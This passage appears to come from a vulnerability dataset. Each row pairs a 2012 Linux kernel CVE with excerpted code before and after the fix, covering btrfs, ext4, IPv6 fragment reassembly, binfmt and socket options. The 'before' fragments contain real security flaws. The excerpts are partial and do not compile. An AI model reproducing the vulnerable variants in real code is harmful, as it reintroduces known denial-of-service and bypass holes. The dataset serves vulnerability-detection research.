	zone->zone_pgdat->node_present_pages += onlined_pages;
 if (onlined_pages) {
 node_set_state(zone_to_nid(zone), N_HIGH_MEMORY);
 if (need_zonelists_rebuild)
 build_all_zonelists(NULL, zone);
 else
 zone_pcp_update(zone);
	}

 mutex_unlock(&zonelists_mutex);

 init_per_zone_wmark_min();

 if (onlined_pages)
 kswapd_run(zone_to_nid(zone));



	vm_total_pages = nr_free_pagecache_pages();

"
2013,DoS ,CVE-2012-5375," struct btrfs_root *root);

/* dir-item.c */


int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}




























































/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;






















 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;











 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"," struct btrfs_root *root);

/* dir-item.c */
int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len);
int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}

int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len)
{
 int ret;
 struct btrfs_key key;
 struct btrfs_dir_item *di;
 int data_size;
 struct extent_buffer *leaf;
 int slot;
 struct btrfs_path *path;


	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;

	key.objectid = dir;
 btrfs_set_key_type(&key, BTRFS_DIR_ITEM_KEY);
	key.offset = btrfs_name_hash(name, name_len);

	ret = btrfs_search_slot(NULL, root, &key, path, 0, 0);

 /* return back any errors */
 if (ret < 0)
 goto out;

 /* nothing found, we're safe */
 if (ret > 0) {
		ret = 0;
 goto out;
	}

 /* we found an item, look for our name in the item */
	di = btrfs_match_dir_item_name(root, path, name, name_len);
 if (di) {
 /* our exact name was found */
		ret = -EEXIST;
 goto out;
	}

 /*
	 * see if there is room in the item to insert this
	 * name
 */
	data_size = sizeof(*di) + name_len + sizeof(struct btrfs_item);
	leaf = path->nodes[0];
	slot = path->slots[0];
 if (data_size + btrfs_item_size_nr(leaf, slot) +
 sizeof(struct btrfs_item) > BTRFS_LEAF_DATA_SIZE(root)) {
		ret = -EOVERFLOW;
	} else {
 /* plenty of insertion room */
		ret = 0;
	}
out:
 btrfs_free_path(path);
 return ret;
}

/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST || ret == -EOVERFLOW)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;


 /* check for collisions, even if the  name isn't there */
	ret = btrfs_check_dir_item_collision(root, new_dir->i_ino,
			     new_dentry->d_name.name,
			     new_dentry->d_name.len);

 if (ret) {
 if (ret == -EEXIST) {
 /* we shouldn't get
			 * eexist without a new_inode */
 if (!new_inode) {
 WARN_ON(1);
 return ret;
			}
		} else {
 /* maybe -EOVERFLOW */
 return ret;
		}
	}
	ret = 0;

 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;

 /*
	 * even if this name doesn't exist, we may get hash collisions.
	 * check for them now when we can safely fail
 */
	error = btrfs_check_dir_item_collision(BTRFS_I(dir)->root,
					       dir->i_ino, name,
					       namelen);
 if (error)
 goto out_dput;

 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST || ret == -EOVERFLOW);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"
2013,DoS ,CVE-2012-5374," struct btrfs_root *root);

/* dir-item.c */


int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}




























































/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;






















 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;











 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"," struct btrfs_root *root);

/* dir-item.c */
int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len);
int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}

int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len)
{
 int ret;
 struct btrfs_key key;
 struct btrfs_dir_item *di;
 int data_size;
 struct extent_buffer *leaf;
 int slot;
 struct btrfs_path *path;


	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;

	key.objectid = dir;
 btrfs_set_key_type(&key, BTRFS_DIR_ITEM_KEY);
	key.offset = btrfs_name_hash(name, name_len);

	ret = btrfs_search_slot(NULL, root, &key, path, 0, 0);

 /* return back any errors */
 if (ret < 0)
 goto out;

 /* nothing found, we're safe */
 if (ret > 0) {
		ret = 0;
 goto out;
	}

 /* we found an item, look for our name in the item */
	di = btrfs_match_dir_item_name(root, path, name, name_len);
 if (di) {
 /* our exact name was found */
		ret = -EEXIST;
 goto out;
	}

 /*
	 * see if there is room in the item to insert this
	 * name
 */
	data_size = sizeof(*di) + name_len + sizeof(struct btrfs_item);
	leaf = path->nodes[0];
	slot = path->slots[0];
 if (data_size + btrfs_item_size_nr(leaf, slot) +
 sizeof(struct btrfs_item) > BTRFS_LEAF_DATA_SIZE(root)) {
		ret = -EOVERFLOW;
	} else {
 /* plenty of insertion room */
		ret = 0;
	}
out:
 btrfs_free_path(path);
 return ret;
}

/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST || ret == -EOVERFLOW)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;


 /* check for collisions, even if the  name isn't there */
	ret = btrfs_check_dir_item_collision(root, new_dir->i_ino,
			     new_dentry->d_name.name,
			     new_dentry->d_name.len);

 if (ret) {
 if (ret == -EEXIST) {
 /* we shouldn't get
			 * eexist without a new_inode */
 if (!new_inode) {
 WARN_ON(1);
 return ret;
			}
		} else {
 /* maybe -EOVERFLOW */
 return ret;
		}
	}
	ret = 0;

 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;

 /*
	 * even if this name doesn't exist, we may get hash collisions.
	 * check for them now when we can safely fail
 */
	error = btrfs_check_dir_item_collision(BTRFS_I(dir)->root,
					       dir->i_ino, name,
					       namelen);
 if (error)
 goto out_dput;

 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST || ret == -EOVERFLOW);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"
2012,DoS ,CVE-2012-4565,"			.tcpv_rttcnt = ca->cnt_rtt,
			.tcpv_minrtt = ca->base_rtt,
		};
		u64 t = ca->sum_rtt;

 do_div(t, ca->cnt_rtt);
 info.tcpv_rtt = t;




 nla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);
	}
}
","			.tcpv_rttcnt = ca->cnt_rtt,
			.tcpv_minrtt = ca->base_rtt,
		};


 if (info.tcpv_rttcnt > 0) {
 	u64 t = ca->sum_rtt;

 do_div(t, info.tcpv_rttcnt);
			info.tcpv_rtt = t;
		}
 nla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);
	}
}
"
2013,Bypass ,CVE-2012-4542,,
2013,#NAME?,CVE-2012-4530," goto _error;
	bprm->argc ++;

	bprm->interp = iname;	/* for binfmt_script */




	interp_file = open_exec (iname);
	retval = PTR_ERR (interp_file);
	retval = copy_strings_kernel(1, &i_name, bprm);
 if (retval) return retval; 
	bprm->argc++;
	bprm->interp = interp;



 /*
	 * OK, now restart the process with the interpreter's dentry.
 mutex_unlock(&current->signal->cred_guard_mutex);
 abort_creds(bprm->cred);
	}



 kfree(bprm);
}













/*
 * install the new credentials for this executable
 */
 unsigned long stack_top,
 int executable_stack);
extern int bprm_mm_init(struct linux_binprm *bprm);

extern int copy_strings_kernel(int argc, const char *const *argv,
 struct linux_binprm *bprm);
extern int prepare_bprm_creds(struct linux_binprm *bprm);
"," goto _error;
	bprm->argc ++;

 /* Update interp in case binfmt_script needs it. */
	retval = bprm_change_interp(iname, bprm);
 if (retval < 0)
 goto _error;

	interp_file = open_exec (iname);
	retval = PTR_ERR (interp_file);
	retval = copy_strings_kernel(1, &i_name, bprm);
 if (retval) return retval; 
	bprm->argc++;
	retval = bprm_change_interp(interp, bprm);
 if (retval < 0)
 return retval;

 /*
	 * OK, now restart the process with the interpreter's dentry.
 mutex_unlock(&current->signal->cred_guard_mutex);
 abort_creds(bprm->cred);
	}
 /* If a binfmt changed the interp, free it. */
 if (bprm->interp != bprm->filename)
 kfree(bprm->interp);
 kfree(bprm);
}

int bprm_change_interp(char *interp, struct linux_binprm *bprm)
{
 /* If a binfmt changed the interp, free it first. */
 if (bprm->interp != bprm->filename)
 kfree(bprm->interp);
	bprm->interp = kstrdup(interp, GFP_KERNEL);
 if (!bprm->interp)
 return -ENOMEM;
 return 0;
}
EXPORT_SYMBOL(bprm_change_interp);

/*
 * install the new credentials for this executable
 */
 unsigned long stack_top,
 int executable_stack);
extern int bprm_mm_init(struct linux_binprm *bprm);
extern int bprm_change_interp(char *interp, struct linux_binprm *bprm);
extern int copy_strings_kernel(int argc, const char *const *argv,
 struct linux_binprm *bprm);
extern int prepare_bprm_creds(struct linux_binprm *bprm);
"
2012,#NAME?,CVE-2012-4508,"#define EXT4_EXT_MARK_UNINIT1 0x2 /* mark first half uninitialized */
#define EXT4_EXT_MARK_UNINIT2 0x4 /* mark second half uninitialized */




static __le32 ext4_extent_block_csum(struct inode *inode,
 struct ext4_extent_header *eh)
{
 unsigned int ee_len, depth;
 int err = 0;




 ext_debug(""ext4_split_extents_at: inode %lu, logical""
 ""block %llu\n"", inode->i_ino, (unsigned long long)split);


	err = ext4_ext_insert_extent(handle, inode, path, &newex, flags);
 if (err == -ENOSPC && (EXT4_EXT_MAY_ZEROOUT & split_flag)) {
		err = ext4_ext_zeroout(inode, &orig_ex);







 if (err)
 goto fix_extent_len;
 /* update the extent length and mark as initialized */
	uninitialized = ext4_ext_is_uninitialized(ex);

 if (map->m_lblk + map->m_len < ee_block + ee_len) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT ?
			      EXT4_EXT_MAY_ZEROOUT : 0;
		flags1 = flags | EXT4_GET_BLOCKS_PRE_IO;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1 |
				       EXT4_EXT_MARK_UNINIT2;


		err = ext4_split_extent_at(handle, inode, path,
				map->m_lblk + map->m_len, split_flag1, flags1);
 if (err)
 return PTR_ERR(path);

 if (map->m_lblk >= ee_block) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT ?
   EXT4_EXT_MAY_ZEROOUT : 0;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1;
 if (split_flag & EXT4_EXT_MARK_UNINIT2)

	split_flag |= ee_block + ee_len <= eof_block ? EXT4_EXT_MAY_ZEROOUT : 0;
	split_flag |= EXT4_EXT_MARK_UNINIT2;


	flags |= EXT4_GET_BLOCKS_PRE_IO;
 return ext4_split_extent(handle, inode, path, map, split_flag, flags);
}

static int ext4_convert_unwritten_extents_endio(handle_t *handle,
 struct inode *inode,
 struct ext4_ext_path *path)

{
 struct ext4_extent *ex;


 int depth;
 int err = 0;

	depth = ext_depth(inode);
	ex = path[depth].p_ext;



 ext_debug(""ext4_convert_unwritten_extents_endio: inode %lu, logical""
 ""block %llu, max_blocks %u\n"", inode->i_ino,
		(unsigned long long)le32_to_cpu(ex->ee_block),
 ext4_ext_get_actual_len(ex));
















	err = ext4_ext_get_access(handle, inode, path + depth);
 if (err)
	}
 /* IO end_io complete, convert the filled extent to written */
 if ((flags & EXT4_GET_BLOCKS_CONVERT)) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode,
							path);
 if (ret >= 0) {
 ext4_update_inode_fsync_trans(handle, inode, 1);
","#define EXT4_EXT_MARK_UNINIT1 0x2 /* mark first half uninitialized */
#define EXT4_EXT_MARK_UNINIT2 0x4 /* mark second half uninitialized */

#define EXT4_EXT_DATA_VALID1 0x8 /* first half contains valid data */
#define EXT4_EXT_DATA_VALID2 0x10 /* second half contains valid data */

static __le32 ext4_extent_block_csum(struct inode *inode,
 struct ext4_extent_header *eh)
{
 unsigned int ee_len, depth;
 int err = 0;

 BUG_ON((split_flag & (EXT4_EXT_DATA_VALID1 | EXT4_EXT_DATA_VALID2)) ==
	       (EXT4_EXT_DATA_VALID1 | EXT4_EXT_DATA_VALID2));

 ext_debug(""ext4_split_extents_at: inode %lu, logical""
 ""block %llu\n"", inode->i_ino, (unsigned long long)split);


	err = ext4_ext_insert_extent(handle, inode, path, &newex, flags);
 if (err == -ENOSPC && (EXT4_EXT_MAY_ZEROOUT & split_flag)) {
 if (split_flag & (EXT4_EXT_DATA_VALID1|EXT4_EXT_DATA_VALID2)) {
 if (split_flag & EXT4_EXT_DATA_VALID1)
				err = ext4_ext_zeroout(inode, ex2);
 else
				err = ext4_ext_zeroout(inode, ex);
		} else
			err = ext4_ext_zeroout(inode, &orig_ex);

 if (err)
 goto fix_extent_len;
 /* update the extent length and mark as initialized */
	uninitialized = ext4_ext_is_uninitialized(ex);

 if (map->m_lblk + map->m_len < ee_block + ee_len) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT;

		flags1 = flags | EXT4_GET_BLOCKS_PRE_IO;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1 |
				       EXT4_EXT_MARK_UNINIT2;
 if (split_flag & EXT4_EXT_DATA_VALID2)
			split_flag1 |= EXT4_EXT_DATA_VALID1;
		err = ext4_split_extent_at(handle, inode, path,
				map->m_lblk + map->m_len, split_flag1, flags1);
 if (err)
 return PTR_ERR(path);

 if (map->m_lblk >= ee_block) {
		split_flag1 = split_flag & (EXT4_EXT_MAY_ZEROOUT |
   EXT4_EXT_DATA_VALID2);
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1;
 if (split_flag & EXT4_EXT_MARK_UNINIT2)

	split_flag |= ee_block + ee_len <= eof_block ? EXT4_EXT_MAY_ZEROOUT : 0;
	split_flag |= EXT4_EXT_MARK_UNINIT2;
 if (flags & EXT4_GET_BLOCKS_CONVERT)
		split_flag |= EXT4_EXT_DATA_VALID2;
	flags |= EXT4_GET_BLOCKS_PRE_IO;
 return ext4_split_extent(handle, inode, path, map, split_flag, flags);
}

static int ext4_convert_unwritten_extents_endio(handle_t *handle,
 struct inode *inode,
 struct ext4_map_blocks *map,
 struct ext4_ext_path *path)
{
 struct ext4_extent *ex;
 ext4_lblk_t ee_block;
 unsigned int ee_len;
 int depth;
 int err = 0;

	depth = ext_depth(inode);
	ex = path[depth].p_ext;
	ee_block = le32_to_cpu(ex->ee_block);
	ee_len = ext4_ext_get_actual_len(ex);

 ext_debug(""ext4_convert_unwritten_extents_endio: inode %lu, logical""
 ""block %llu, max_blocks %u\n"", inode->i_ino,
		  (unsigned long long)ee_block, ee_len);

 /* If extent is larger than requested then split is required */
 if (ee_block != map->m_lblk || ee_len > map->m_len) {
		err = ext4_split_unwritten_extents(handle, inode, map, path,
						   EXT4_GET_BLOCKS_CONVERT);
 if (err < 0)
 goto out;
 ext4_ext_drop_refs(path);
		path = ext4_ext_find_extent(inode, map->m_lblk, path);
 if (IS_ERR(path)) {
			err = PTR_ERR(path);
 goto out;
		}
		depth = ext_depth(inode);
		ex = path[depth].p_ext;
	}

	err = ext4_ext_get_access(handle, inode, path + depth);
 if (err)
	}
 /* IO end_io complete, convert the filled extent to written */
 if ((flags & EXT4_GET_BLOCKS_CONVERT)) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode, map,
							path);
 if (ret >= 0) {
 ext4_update_inode_fsync_trans(handle, inode, 1);
"
2012,DoS +Info ,CVE-2012-4467,"	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&ktv);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timeval(up, &ktv);

 return err;
}
	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&kts);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timespec(up, &kts);

 return err;
}
","	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&ktv);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timeval(&ktv, up);

 return err;
}
	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&kts);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timespec(&kts, up);

 return err;
}
"
2013,DoS ,CVE-2012-4461,,
2012,Bypass ,CVE-2012-4444,"}
EXPORT_SYMBOL(ip6_frag_match);

/* Memory Tracking Functions. */
static void frag_kfree_skb(struct netns_frags *nf, struct sk_buff *skb)
{
 atomic_sub(skb->truesize, &nf->mem);
 kfree_skb(skb);
}

void ip6_frag_init(struct inet_frag_queue *q, void *a)
{
 struct frag_queue *fq = container_of(q, struct frag_queue, q);
	}

found:
 /* We found where to put this one.  Check for overlap with
	 * preceding fragment, and, if needed, align things so that
	 * any overlaps are eliminated.



 */
 if (prev) {
 int i = (FRAG6_CB(prev)->offset + prev->len) - offset;

 if (i > 0) {
			offset += i;
 if (end <= offset)
 goto err;
 if (!pskb_pull(skb, i))
 goto err;
 if (skb->ip_summed != CHECKSUM_UNNECESSARY)
				skb->ip_summed = CHECKSUM_NONE;
		}
	}

 /* Look for overlap with succeeding segments.
	 * If we can merge fragments, do it.
 */
 while (next && FRAG6_CB(next)->offset < end) {
 int i = end - FRAG6_CB(next)->offset; /* overlap is 'i' bytes */

 if (i < next->len) {
 /* Eat head of the next overlapped fragment
			 * and leave the loop. The next ones cannot overlap.
 */
 if (!pskb_pull(next, i))
 goto err;
 FRAG6_CB(next)->offset += i;	/* next fragment */
			fq->q.meat -= i;
 if (next->ip_summed != CHECKSUM_UNNECESSARY)
				next->ip_summed = CHECKSUM_NONE;
 break;
		} else {
 struct sk_buff *free_it = next;

 /* Old fragment is completely overridden with
			 * new one drop it.
 */
			next = next->next;

 if (prev)
				prev->next = next;
 else
				fq->q.fragments = next;

			fq->q.meat -= free_it->len;
 frag_kfree_skb(fq->q.net, free_it);
		}
	}

 FRAG6_CB(skb)->offset = offset;

 write_unlock(&ip6_frags.lock);
 return -1;



err:
 IP6_INC_STATS(net, ip6_dst_idev(skb_dst(skb)),
		      IPSTATS_MIB_REASMFAILS);
","}
EXPORT_SYMBOL(ip6_frag_match);








void ip6_frag_init(struct inet_frag_queue *q, void *a)
{
 struct frag_queue *fq = container_of(q, struct frag_queue, q);
	}

found:
 /* RFC5722, Section 4:
	 *                                  When reassembling an IPv6 datagram, if
	 *   one or more its constituent fragments is determined to be an
	 *   overlapping fragment, the entire datagram (and any constituent
	 *   fragments, including those not yet received) MUST be silently
	 *   discarded.
 */



 /* Check for overlap with preceding fragment. */
 if (prev &&
	    (FRAG6_CB(prev)->offset + prev->len) - offset > 0)
 goto discard_fq;







 /* Look for overlap with succeeding segment. */
 if (next && FRAG6_CB(next)->offset < end)
 goto discard_fq;
































 FRAG6_CB(skb)->offset = offset;

 write_unlock(&ip6_frags.lock);
 return -1;

discard_fq:
 fq_kill(fq);
err:
 IP6_INC_STATS(net, ip6_dst_idev(skb_dst(skb)),
		      IPSTATS_MIB_REASMFAILS);
"
2013,DoS ,CVE-2012-4398,,
2012,DoS ,CVE-2012-3552," unsigned char	__data[0];
};

#define optlength(opt) (sizeof(struct ip_options) + opt->optlen)









struct inet_request_sock {
 struct request_sock	req;
				acked	   : 1,
				no_srccheck: 1;
 kmemcheck_bitfield_end(flags);
 struct ip_options	*opt;
};

static inline struct inet_request_sock *inet_rsk(const struct request_sock *sk)
	__be16			inet_sport;
	__u16			inet_id;

 struct ip_options	*opt;
	__u8			tos;
	__u8			min_ttl;
	__u8			mc_ttl;
struct ipcm_cookie {
	__be32			addr;
 int			oif;
 struct ip_options	*opt;
	__u8			tx_flags;
};


extern int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,
					      __be32 saddr, __be32 daddr,
 struct ip_options *opt);
extern int ip_rcv(struct sk_buff *skb, struct net_device *dev,
 struct packet_type *pt, struct net_device *orig_dev);
extern int ip_local_deliver(struct sk_buff *skb);
 *	Functions provided by ip_options.c
 */

extern void ip_options_build(struct sk_buff *skb, struct ip_options *opt, __be32 daddr, struct rtable *rt, int is_frag);

extern int ip_options_echo(struct ip_options *dopt, struct sk_buff *skb);
extern void ip_options_fragment(struct sk_buff *skb);
extern int ip_options_compile(struct net *net,
 struct ip_options *opt, struct sk_buff *skb);
extern int ip_options_get(struct net *net, struct ip_options **optp,
 unsigned char *data, int optlen);
extern int ip_options_get_from_user(struct net *net, struct ip_options **optp,
 unsigned char __user *data, int optlen);
extern void ip_options_undo(struct ip_options * opt);
extern void ip_forward_options(struct sk_buff *skb);
 struct flowi4 fl4;
 struct rtable *rt;
 int err;


	dp->dccps_role = DCCP_ROLE_CLIENT;

 return -EAFNOSUPPORT;

	nexthop = daddr = usin->sin_addr.s_addr;
 if (inet->opt != NULL && inet->opt->srr) {



 if (daddr == 0)
 return -EINVAL;
		nexthop = inet->opt->faddr;
	}

	orig_sport = inet->inet_sport;
 return -ENETUNREACH;
	}

 if (inet->opt == NULL || !inet->opt->srr)
		daddr = rt->rt_dst;

 if (inet->inet_saddr == 0)
	inet->inet_daddr = daddr;

 inet_csk(sk)->icsk_ext_hdr_len = 0;
 if (inet->opt != NULL)
 inet_csk(sk)->icsk_ext_hdr_len = inet->opt->optlen;
 /*
	 * Socket identity is still unknown (sport may be zero).
	 * However we set state to DCCP_REQUESTING and not releasing socket
	newinet->inet_daddr	= ireq->rmt_addr;
	newinet->inet_rcv_saddr = ireq->loc_addr;
	newinet->inet_saddr	= ireq->loc_addr;
	newinet->opt = ireq->opt;
	ireq->opt	   = NULL;
	newinet->mc_index  = inet_iif(skb);
	newinet->mc_ttl	   = ip_hdr(skb)->ttl;

	   First: no IPv4 options.
 */
	newinet->opt = NULL;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;
 WARN_ON(sk->sk_wmem_queued);
 WARN_ON(sk->sk_forward_alloc);

 kfree(inet->opt);
 dst_release(rcu_dereference_check(sk->sk_dst_cache, 1));
 sk_refcnt_debug_dec(sk);
}
 struct flowi4 fl4;
 struct rtable *rt;
	__be32 new_saddr;


 if (inet->opt && inet->opt->srr)
		daddr = inet->opt->faddr;



 /* Query new route. */
	rt = ip_route_connect(&fl4, daddr, 0, RT_CONN_FLAGS(sk),
 struct inet_sock *inet = inet_sk(sk);
 struct rtable *rt = (struct rtable *)__sk_dst_check(sk, 0);
	__be32 daddr;

 int err;

 /* Route is OK, nothing to do. */
 if (rt)
 return 0;

 /* Reroute. */


	daddr = inet->inet_daddr;
 if (inet->opt && inet->opt->srr)
		daddr = inet->opt->faddr;

	rt = ip_route_output_ports(sock_net(sk), sk, daddr, inet->inet_saddr,
				   inet->inet_dport, inet->inet_sport,
				   sk->sk_protocol, RT_CONN_FLAGS(sk),
"," unsigned char	__data[0];
};

struct ip_options_rcu {
 struct rcu_head rcu;
 struct ip_options opt;
};

struct ip_options_data {
 struct ip_options_rcu	opt;
 char			data[40];
};

struct inet_request_sock {
 struct request_sock	req;
				acked	   : 1,
				no_srccheck: 1;
 kmemcheck_bitfield_end(flags);
 struct ip_options_rcu	*opt;
};

static inline struct inet_request_sock *inet_rsk(const struct request_sock *sk)
	__be16			inet_sport;
	__u16			inet_id;

 struct ip_options_rcu __rcu	*inet_opt;
	__u8			tos;
	__u8			min_ttl;
	__u8			mc_ttl;
struct ipcm_cookie {
	__be32			addr;
 int			oif;
 struct ip_options_rcu	*opt;
	__u8			tx_flags;
};


extern int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,
					      __be32 saddr, __be32 daddr,
 struct ip_options_rcu *opt);
extern int ip_rcv(struct sk_buff *skb, struct net_device *dev,
 struct packet_type *pt, struct net_device *orig_dev);
extern int ip_local_deliver(struct sk_buff *skb);
 *	Functions provided by ip_options.c
 */

extern void ip_options_build(struct sk_buff *skb, struct ip_options *opt,
			     __be32 daddr, struct rtable *rt, int is_frag);
extern int ip_options_echo(struct ip_options *dopt, struct sk_buff *skb);
extern void ip_options_fragment(struct sk_buff *skb);
extern int ip_options_compile(struct net *net,
 struct ip_options *opt, struct sk_buff *skb);
extern int ip_options_get(struct net *net, struct ip_options_rcu **optp,
 unsigned char *data, int optlen);
extern int ip_options_get_from_user(struct net *net, struct ip_options_rcu **optp,
 unsigned char __user *data, int optlen);
extern void ip_options_undo(struct ip_options * opt);
extern void ip_forward_options(struct sk_buff *skb);
 struct flowi4 fl4;
 struct rtable *rt;
 int err;
 struct ip_options_rcu *inet_opt;

	dp->dccps_role = DCCP_ROLE_CLIENT;

 return -EAFNOSUPPORT;

	nexthop = daddr = usin->sin_addr.s_addr;

	inet_opt = rcu_dereference_protected(inet->inet_opt,
 sock_owned_by_user(sk));
 if (inet_opt != NULL && inet_opt->opt.srr) {
 if (daddr == 0)
 return -EINVAL;
		nexthop = inet_opt->opt.faddr;
	}

	orig_sport = inet->inet_sport;
 return -ENETUNREACH;
	}

 if (inet_opt == NULL || !inet_opt->opt.srr)
		daddr = rt->rt_dst;

 if (inet->inet_saddr == 0)
	inet->inet_daddr = daddr;

 inet_csk(sk)->icsk_ext_hdr_len = 0;
 if (inet_opt)
 inet_csk(sk)->icsk_ext_hdr_len = inet_opt->opt.optlen;
 /*
	 * Socket identity is still unknown (sport may be zero).
	 * However we set state to DCCP_REQUESTING and not releasing socket
	newinet->inet_daddr	= ireq->rmt_addr;
	newinet->inet_rcv_saddr = ireq->loc_addr;
	newinet->inet_saddr	= ireq->loc_addr;
	newinet->inet_opt = ireq->opt;
	ireq->opt	   = NULL;
	newinet->mc_index  = inet_iif(skb);
	newinet->mc_ttl	   = ip_hdr(skb)->ttl;

	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;
 WARN_ON(sk->sk_wmem_queued);
 WARN_ON(sk->sk_forward_alloc);

 kfree(rcu_dereference_protected(inet->inet_opt, 1));
 dst_release(rcu_dereference_check(sk->sk_dst_cache, 1));
 sk_refcnt_debug_dec(sk);
}
 struct flowi4 fl4;
 struct rtable *rt;
	__be32 new_saddr;
 struct ip_options_rcu *inet_opt;

	inet_opt = rcu_dereference_protected(inet->inet_opt,
 sock_owned_by_user(sk));
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;

 /* Query new route. */
	rt = ip_route_connect(&fl4, daddr, 0, RT_CONN_FLAGS(sk),
 struct inet_sock *inet = inet_sk(sk);
 struct rtable *rt = (struct rtable *)__sk_dst_check(sk, 0);
	__be32 daddr;
 struct ip_options_rcu *inet_opt;
 int err;

 /* Route is OK, nothing to do. */
 if (rt)
 return 0;

 /* Reroute. */
 rcu_read_lock();
	inet_opt = rcu_dereference(inet->inet_opt);
	daddr = inet->inet_daddr;
